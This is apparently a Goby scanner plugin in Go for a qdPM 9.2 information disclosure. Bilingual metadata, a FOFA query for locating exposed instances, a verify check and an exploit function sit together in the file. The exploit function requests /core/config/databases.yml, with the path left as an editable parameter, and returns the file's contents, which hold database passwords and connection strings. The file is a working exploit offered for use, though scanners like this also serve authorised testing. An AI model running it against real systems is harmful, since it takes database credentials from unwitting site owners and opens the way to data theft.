package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "qdPM 9.2 Database Information leakage",
    "Description": "The password and connection string for the database are stored in a yml file. To access the yml file you can go to /core/config/databases.yml file and download.",
    "Impact": "qdPM 9.2 Database Information leakage",
    "Recommendation": "<p>1. Strictly limit the access rights of the database. </p><p>2. Encrypt sensitive data. </p><p>3. Avoid storing important information such as user passwords directly in the database. </p>",
    "Product": "qdPM",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "qdPM 9.2 Database 信息泄露漏洞",
            "Description": "<p>qdPM是一个免费的基于Web的项目管理工具，可以与客户操作系统交互并借此轻松管理项目，任务和人员</p><p>攻击者可以利用此漏洞来获取数据库中的数据，进而进行非法操作</p>",
            "Impact": "<p>攻击者可以利用此漏洞来获取数据库中的数据，进而进行非法操作</p>",
            "Recommendation": "<p>1、严格限制数据库的访问权限。</p><p>2、对数据敏感信息进行加密。</p><p>3、避免直接将用户密码等重要信息存储在数据库中。</p>",
            "Product": "qdPM",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "qdPM 9.2 Database Information leakage",
            "Description": "The password and connection string for the database are stored in a yml file. To access the yml file you can go to /core/config/databases.yml file and download.",
            "Impact": "qdPM 9.2 Database Information leakage",
            "Recommendation": "<p>1. Strictly limit the access rights of the database. </p><p>2. Encrypt sensitive data. </p><p>3. Avoid storing important information such as user passwords directly in the database. </p>",
            "Product": "qdPM",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "body=\"qdPM\"",
    "GobyQuery": "body=\"qdPM\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://qdpm.net/",
    "DisclosureDate": "2021-08-05",
    "References": [
        "https://packetstormsecurity.com/files/163735/qdPM-9.2-Information-Disclosure.html"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "1",
    "CVSS": "5.6",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "ymlpath",
            "type": "input",
            "value": "/core/config/databases.yml",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "qdPM"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/core/config/databases.yml"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "php echo urlencode") && strings.Contains(resp.Utf8Html, "doctrine")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["ymlpath"].(string)
			uri := cmd
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.Utf8Html
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
